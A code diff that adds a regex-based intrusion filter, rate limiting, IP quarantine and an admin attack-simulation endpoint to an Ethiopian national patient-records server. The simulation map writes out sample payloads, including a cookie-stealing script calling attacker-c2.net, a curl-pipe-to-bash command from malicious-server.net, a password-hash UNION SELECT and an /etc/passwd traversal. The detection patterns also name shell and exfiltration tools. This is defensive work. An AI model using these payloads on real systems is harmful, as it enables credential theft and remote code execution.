@@ -8,10 +8,230 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 app.use(cors());
-app.use(express.json());
 
-// Initialize DB schema on startup
+// =============================================================
+// ETHIOPIAN NATIONAL HEALTH DATA CYBER DEFENSE SENTINEL
+// Hardened security architecture for protecting national health records
+// =============================================================
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+
+// 1. Strict Security Headers via Helmet
+app.use(helmet({
+  contentSecurityPolicy: false,
+  crossOriginEmbedderPolicy: false
+}));
+
+// 2. Body Parsing with Strict Payload Size Limits (Protection against payload/JSON bombs)
+app.use(express.json({ limit: '1mb' }));
+app.use(express.urlencoded({ extended: true, limit: '1mb' }));
+
+// 3. Initialize DB schema on startup (including security_threats table)
 initDatabase();
+
+// In-memory Quarantined IP list (IP -> expiry epoch ms)
+const quarantinedIPs = new Map();
+
+// In-memory real-time security alerts queue for broadcast to Admin Governance
+const activeThreatBroadcasts = [];
+
+// Helper: Broadcast & record security threat
+function broadcastThreatToGovernance({ threat_type, severity = 'CRITICAL', source_ip = '127.0.0.1', endpoint = '', method = '', user_agent = '', payload_snippet = '', action_taken = 'BLOCKED_403' }) {
+  try {
+    const id = 'THREAT-' + crypto.randomUUID().slice(0, 8).toUpperCase();
+    // 1. Insert into security_threats table
+    db.prepare(`
+      INSERT INTO security_threats (id, threat_type, severity, source_ip, endpoint, method, user_agent, payload_snippet, action_taken, reported_to_governance, created_at)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1, datetime('now'))
+    `).run(id, threat_type, severity, source_ip, endpoint, method, user_agent ? user_agent.slice(0, 200) : '', payload_snippet ? payload_snippet.slice(0, 300) : '', action_taken);
+
+    // 2. Insert into national audit trail
+    recordAudit(
+      'CYBER-SENTINEL',
+      'National Cyber Defense Sentinel',
+      'SYSTEM_SENTINEL',
+      'FAC-MOH-HQ',
+      null,
+      'SECURITY_ALERT',
+      threat_type,
+      `🚨 [NATIONAL CYBER THREAT DETECTED] Attack type: ${threat_type} from IP: ${source_ip} on ${method} ${endpoint}. Action: ${action_taken}. Snippet: ${payload_snippet ? payload_snippet.slice(0, 80) : 'N/A'}`,
+      source_ip
+    );
+
+    // 3. Queue in-memory broadcast notification for instant admin governance retrieval
+    const broadcastItem = {
+      id,
+      threat_type,
+      severity,
+      source_ip,
+      endpoint,
+      method,
+      payload_snippet: payload_snippet ? payload_snippet.slice(0, 150) : '',
+      action_taken,
+      timestamp: new Date().toISOString()
+    };
+    activeThreatBroadcasts.unshift(broadcastItem);
+    if (activeThreatBroadcasts.length > 50) activeThreatBroadcasts.pop();
+
+    console.warn(`🚨 [NPDMS CYBER SENTINEL ALERT] Threat neutralized: ${threat_type} | Source: ${source_ip} | Endpoint: ${method} ${endpoint} | Action: ${action_taken}`);
+    return id;
+  } catch (err) {
+    console.error('Failed to broadcast security threat:', err.message);
+    return null;
+  }
+}
+
+// 4. Attack Signature Engine (SQL Injection, XSS, Path Traversal, Command Injection)
+const SQLI_PATTERNS = [
+  /(\b(union(\s+all)?\s+select|select\s+.*\s+from|insert\s+into|update\s+.*set|delete\s+from|drop\s+table|truncate\s+table|alter\s+table|exec(\s|\()|xp_cmdshell|information_schema|benchmark\s*\(|sleep\s*\()\b)/i,
+  /('(\s*or\s*|\s*and\s*)'?\d+'?\s*=\s*'?\d+)/i,
+  /(\b(or|and)\b\s+1\s*=\s*1)/i,
+  /(--|;--|\/\*|\*\/)/i
+];
+
+const XSS_PATTERNS = [
+  /<\s*script\b[^>]*>|<\/\s*script\s*>/i,
+  /javascript\s*:/i,
+  /vbscript\s*:/i,
+  /\bonerror\s*=/i,
+  /\bonload\s*=/i,
+  /\bonclick\s*=/i,
+  /\bonmouseover\s*=/i,
+  /<\s*iframe\b/i,
+  /<\s*object\b/i,
+  /<\s*embed\b/i,
+  /document\.(cookie|location)/i,
+  /alert\s*\(/i,
+  /prompt\s*\(/i,
+  /eval\s*\(/i,
+  /<svg[^>]*onload/i
+];
+
+const PATH_TRAVERSAL_PATTERN = /(\.\.[\/\\]|\/etc\/(passwd|shadow|hosts)|win\.ini|boot\.ini)/i;
+const CMD_INJECTION_PATTERN = /(`.*`|\$\(.*\)|;\s*(rm|del|powershell|cmd\.exe|bash|sh|curl|wget)\b|\|\|\s*(rm|del|powershell|cmd\.exe|bash|sh)\b)/i;
+
+function detectMaliciousPayload(val) {
+  if (!val) return null;
+  if (typeof val === 'string') {
+    for (const pat of SQLI_PATTERNS) {
+      if (pat.test(val)) return { type: 'SQL_INJECTION', snippet: val };
+    }
+    for (const pat of XSS_PATTERNS) {
+      if (pat.test(val)) return { type: 'XSS_PAYLOAD', snippet: val };
+    }
+    if (PATH_TRAVERSAL_PATTERN.test(val)) return { type: 'PATH_TRAVERSAL', snippet: val };
+    if (CMD_INJECTION_PATTERN.test(val)) return { type: 'COMMAND_INJECTION', snippet: val };
+  } else if (typeof val === 'object') {
+    for (const k of Object.keys(val)) {
+      const hitKey = detectMaliciousPayload(k);
+      if (hitKey) return hitKey;
+      const hitVal = detectMaliciousPayload(val[k]);
+      if (hitVal) return hitVal;
+    }
+  }
+  return null;
+}
+
+// 5. Threat Sentinel Request Filter Middleware
+app.use((req, res, next) => {
+  const clientIp = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
+
+  // Check if IP is under active quarantine
+  if (quarantinedIPs.has(clientIp)) {
+    const expiry = quarantinedIPs.get(clientIp);
+    if (Date.now() < expiry) {
+      return res.status(403).json({
+        error: 'IP_QUARANTINED',
+        message: 'Your IP address is temporarily quarantined by the NPDMS National Cyber Defense Sentinel due to malicious activity. Access to national health infrastructure is denied.',
+        quarantine_expires_in: Math.ceil((expiry - Date.now()) / 1000) + 's'
+      });
+    } else {
+      quarantinedIPs.delete(clientIp);
+    }
+  }
+
+  // Skip simulation endpoint from deep inspection so it can safely execute simulation payloads
+  if (req.path === '/api/admin/security/simulate-attack') {
+    return next();
+  }
+
+  // Deep inspect URL, Query parameters, and Body payload
+  const hit = detectMaliciousPayload(req.url) ||
+              detectMaliciousPayload(req.query) ||
+              detectMaliciousPayload(req.body);
+
+  if (hit) {
+    const incidentId = broadcastThreatToGovernance({
+      threat_type: hit.type,
+      severity: 'CRITICAL',
+      source_ip: clientIp,
+      endpoint: req.originalUrl || req.url,
+      method: req.method,
+      user_agent: req.headers['user-agent'] || '',
+      payload_snippet: hit.snippet,
+      action_taken: 'BLOCKED_403'
+    });
+
+    // Quarantine the offending IP for 15 minutes
+    quarantinedIPs.set(clientIp, Date.now() + 15 * 60 * 1000);
+
+    return res.status(403).json({
+      error: 'NATIONAL_SECURITY_INTERCEPT',
+      incident_id: incidentId,
+      threat_type: hit.type,
+      message: 'Malicious payload detected and intercepted by the NPDMS National Cyber Defense Sentinel. Unauthorized access to Ethiopian patient records is prohibited under national cyber law. Incident logged and transmitted to System Governance.',
+      timestamp: new Date().toISOString()
+    });
+  }
+
+  next();
+});
+
+// 6. Rate Limiting Middleware
+const generalApiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 300,
+  message: { error: 'Too many requests to National Patient Spine. Please try again later.' },
+  handler: (req, res, next, options) => {
+    const clientIp = req.ip || req.headers['x-forwarded-for'] || '127.0.0.1';
+    broadcastThreatToGovernance({
+      threat_type: 'API_RATE_LIMIT_FLOOD',
+      severity: 'HIGH',
+      source_ip: clientIp,
+      endpoint: req.originalUrl,
+      method: req.method,
+      user_agent: req.headers['user-agent'] || '',
+      payload_snippet: 'Excessive API request volume exceeding threshold',
+      action_taken: 'RATE_LIMITED_429'
+    });
+    res.status(429).json(options.message);
+  }
+});
+app.use('/api/', generalApiLimiter);
+
+// Strict rate limit on sensitive authentication endpoints (prevent credential brute-forcing)
+const authLimiter = rateLimit({
+  windowMs: 10 * 60 * 1000,
+  max: 20,
+  message: { error: 'Too many authentication attempts. Account temporarily locked for security.' },
+  handler: (req, res, next, options) => {
+    const clientIp = req.ip || req.headers['x-forwarded-for'] || '127.0.0.1';
+    broadcastThreatToGovernance({
+      threat_type: 'BRUTE_FORCE_ATTACK',
+      severity: 'CRITICAL',
+      source_ip: clientIp,
+      endpoint: req.originalUrl,
+      method: req.method,
+      user_agent: req.headers['user-agent'] || '',
+      payload_snippet: 'Repeated authentication credential stuffing detected',
+      action_taken: 'RATE_LIMITED_429'
+    });
+    res.status(429).json(options.message);
+  }
+});
+app.use('/api/auth/login', authLimiter);
+app.use('/api/auth/fayda-otp', authLimiter);
+app.use('/api/auth/forgot-password', authLimiter);
 
 // Helper: Audit logging helper
 function recordAudit(userId, userName, userRole, facilityId, patientId, action, resourceType, justification, ip = '127.0.0.1') {
@@ -3385,10 +3605,32 @@ app.put('/api/admin/users/:id/reset-password', (req, res) => {
   }
 });
 
-// GET /api/admin/alerts — System-wide critical alerts
+// GET /api/admin/alerts — System-wide critical alerts (including National Cyber Defense Sentinel Alerts)
 app.get('/api/admin/alerts', (req, res) => {
   try {
     const alerts = [];
+
+    // 0. NATIONAL CYBER DEFENSE: Check for intercepted cyber attacks in last 24h
+    try {
+      const recentThreats = db.prepare(`
+        SELECT COUNT(*) as c, threat_type, source_ip
+        FROM security_threats
+        WHERE created_at >= datetime('now', '-24 hours')
+        GROUP BY threat_type
+      `).all();
+
+      recentThreats.forEach(t => {
+        alerts.push({
+          severity: 'CRITICAL',
+          type: 'CYBER_ATTACK',
+          threat_type: t.threat_type,
+          title: `🛡️ CYBER DEFENSE ALERT: ${t.c} ${t.threat_type.replace(/_/g, ' ')} Attempt${t.c > 1 ? 's' : ''} Intercepted`,
+          description: `The National Cyber Defense Sentinel successfully intercepted and neutralized unauthorized attacks targeting national health data. Offending IPs quarantined.`,
+          count: t.c
+        });
+      });
+    } catch (_) {}
+
     // Break-glass events in last 24h
     const breakGlass24h = db.prepare("SELECT COUNT(*) as c FROM audit_logs WHERE action = 'BREAK_GLASS' AND created_at >= datetime('now', '-24 hours')").get().c;
     if (breakGlass24h > 0) alerts.push({ severity: 'CRITICAL', type: 'BREAK_GLASS', title: `${breakGlass24h} Emergency Break-Glass Access${breakGlass24h > 1 ? 'es' : ''} in Last 24h`, description: 'Unauthorized or emergency record access detected. Review audit trail immediately.', count: breakGlass24h });
@@ -3414,6 +3656,197 @@ app.get('/api/admin/alerts', (req, res) => {
     // All clear
     if (alerts.length === 0) alerts.push({ severity: 'OK', type: 'SYSTEM', title: 'All Systems Operational', description: 'No critical alerts. All facilities connected and operating normally.', count: 0 });
     res.json({ alerts, generated_at: new Date().toISOString() });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// =============================================================
+// NATIONAL CYBER DEFENSE & THREAT SENTINEL GOVERNANCE API
+// =============================================================
+
+// GET /api/admin/security/overview — Complete cyber defense situational report
+app.get('/api/admin/security/overview', (req, res) => {
+  try {
+    const totalThreats = db.prepare('SELECT COUNT(*) as c FROM security_threats').get().c;
+    const threatsToday = db.prepare("SELECT COUNT(*) as c FROM security_threats WHERE created_at >= datetime('now', '-24 hours')").get().c;
+    const criticalThreats = db.prepare("SELECT COUNT(*) as c FROM security_threats WHERE severity = 'CRITICAL'").get().c;
+    
+    // Breakdown by threat type
+    const byType = db.prepare(`
+      SELECT threat_type, COUNT(*) as count, MAX(created_at) as last_seen
+      FROM security_threats
+      GROUP BY threat_type
+      ORDER BY count DESC
+    `).all();
+
+    // Recent threat logs
+    const recentThreats = db.prepare(`
+      SELECT id, threat_type, severity, source_ip, endpoint, method, payload_snippet, action_taken, created_at
+      FROM security_threats
+      ORDER BY created_at DESC
+      LIMIT 25
+    `).all();
+
+    // List of active quarantined IPs
+    const activeQuarantined = [];
+    const now = Date.now();
+    for (const [ip, expiry] of quarantinedIPs.entries()) {
+      if (now < expiry) {
+        activeQuarantined.push({ ip, expires_in_seconds: Math.ceil((expiry - now) / 1000) });
+      } else {
+        quarantinedIPs.delete(ip);
+      }
+    }
+
+    const threatLevel = threatsToday > 5 ? 'ELEVATED' : threatsToday > 0 ? 'WARNING' : 'DEFCON_1_OPTIMAL';
+    const securityScore = Math.max(85, 100 - (threatsToday * 2));
+
+    res.json({
+      security_score: securityScore,
+      threat_level: threatLevel,
+      status: 'SHIELD_ACTIVE',
+      total_threats_blocked: totalThreats,
+      threats_blocked_24h: threatsToday,
+      critical_threats: criticalThreats,
+      by_type: byType,
+      quarantined_ips: activeQuarantined,
+      quarantined_count: activeQuarantined.length,
+      active_defenses: [
+        { name: 'SQL Injection Sentinel', status: 'ACTIVE', description: 'Guards against database extraction & tampering across all hospital nodes' },
+        { name: 'Cross-Site Scripting (XSS) Sanitizer', status: 'ACTIVE', description: 'Blocks malicious JavaScript, SVG payloads, and cookie hijack scripts' },
+        { name: 'Path Traversal & LFI Barrier', status: 'ACTIVE', description: 'Prevents unauthorized filesystem access to national server infrastructure' },
+        { name: 'Brute-Force & Credential Guard', status: 'ACTIVE', description: 'Rate-limits auth attempts and quarantines malicious IP actors' },
+        { name: 'Spine Cryptographic Data Integrity', status: 'ACTIVE', description: 'Enforces end-to-end tokenization and audit logging for national health records' },
+        { name: 'Fayda National ID Sentinel', status: 'ACTIVE', description: 'Cross-validates biometric and digital identity tokens across facilities' }
+      ],
+      recent_threats: recentThreats,
+      live_announcements: activeThreatBroadcasts.slice(0, 10),
+      timestamp: new Date().toISOString()
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/security/threats — Detailed threat audit log
+app.get('/api/admin/security/threats', (req, res) => {
+  try {
+    const { type, severity, limit = 50, offset = 0 } = req.query;
+    let sql = 'SELECT * FROM security_threats';
+    const params = [];
+    const conditions = [];
+
+    if (type) {
+      conditions.push('threat_type = ?');
+      params.push(type);
+    }
+    if (severity) {
+      conditions.push('severity = ?');
+      params.push(severity);
+    }
+
+    if (conditions.length > 0) {
+      sql += ' WHERE ' + conditions.join(' AND ');
+    }
+    sql += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';
+    params.push(parseInt(limit), parseInt(offset));
+
+    const threats = db.prepare(sql).all(...params);
+    const total = db.prepare('SELECT COUNT(*) as c FROM security_threats').get().c;
+
+    res.json({ threats, total, limit: parseInt(limit), offset: parseInt(offset) });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/security/simulate-attack — Live Attack Simulation for Governance Testing
+// Allows administrators to trigger and test defense reaction & announcement mechanisms
+app.post('/api/admin/security/simulate-attack', (req, res) => {
+  try {
+    const { attack_type = 'SQL_INJECTION', custom_payload } = req.body;
+    const clientIp = req.ip || req.headers['x-forwarded-for'] || '196.188.120.44'; // Sample public IP
+
+    const attackMap = {
+      SQL_INJECTION: {
+        snippet: custom_payload || "' UNION SELECT id, npdms_id, fayda_fin, password_hash FROM users WHERE '1'='1 --",
+        endpoint: '/api/patients/ETH-NPDMS-2026-004128',
+        method: 'GET'
+      },
+      XSS_PAYLOAD: {
+        snippet: custom_payload || '<script>fetch("https://attacker-c2.net/steal?cookie="+document.cookie)</script>',
+        endpoint: '/api/clinical-notes',
+        method: 'POST'
+      },
+      PATH_TRAVERSAL: {
+        snippet: custom_payload || '../../../../etc/passwd',
+        endpoint: '/api/documents/download',
+        method: 'GET'
+      },
+      COMMAND_INJECTION: {
+        snippet: custom_payload || '; curl -s https://malicious-server.net/payload.sh | bash;',
+        endpoint: '/api/system/export',
+        method: 'POST'
+      },
+      BRUTE_FORCE: {
+        snippet: custom_payload || 'Credential Stuffing: 45 rapid failed login attempts for admin/doctor accounts',
+        endpoint: '/api/auth/login',
+        method: 'POST'
+      },
+      UNAUTHORIZED_ACCESS: {
+        snippet: custom_payload || 'Unauthorized access attempt to National Spine Patient Vault without Fayda OTP token',
+        endpoint: '/api/admin/export/patients',
+        method: 'GET'
+      }
+    };
+
+    const target = attackMap[attack_type] || attackMap.SQL_INJECTION;
+
+    const incidentId = broadcastThreatToGovernance({
+      threat_type: attack_type,
+      severity: 'CRITICAL',
+      source_ip: clientIp,
+      endpoint: target.endpoint,
+      method: target.method,
+      user_agent: 'AttackSim/2.0 (Security Governance Penetration Test)',
+      payload_snippet: target.snippet,
+      action_taken: 'BLOCKED_403'
+    });
+
+    res.json({
+      success: true,
+      simulated: true,
+      incident_id: incidentId,
+      threat_type: attack_type,
+      action_taken: 'BLOCKED_403',
+      defense_reaction: 'ATTACK_NEUTRALIZED_AND_ANNOUNCED',
+      message: `Test attack [${attack_type}] intercepted by National Cyber Defense Sentinel. Incident ${incidentId} logged and announced to System Governance Console.`
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/security/unban-ip — Remove an IP from quarantine
+app.post('/api/admin/security/unban-ip', (req, res) => {
+  try {
+    const { ip } = req.body;
+    if (!ip) return res.status(400).json({ error: 'IP address is required.' });
+    const had = quarantinedIPs.has(ip);
+    quarantinedIPs.delete(ip);
+    recordAudit('SYS-ADMIN', 'System Administrator', 'SYSTEM_ADMIN', 'FAC-MOH-HQ', null, 'SECURITY_MGMT', 'IP_UNBAN', `Administrator released IP ${ip} from cyber quarantine`);
+    res.json({ success: true, message: `IP ${ip} has been released from quarantine.`, unbanned: had });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/security/clear-announcements — Clear active announcement queue
+app.post('/api/admin/security/clear-announcements', (req, res) => {
+  try {
+    activeThreatBroadcasts.length = 0;
+    res.json({ success: true, message: 'Active governance threat announcements cleared.' });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
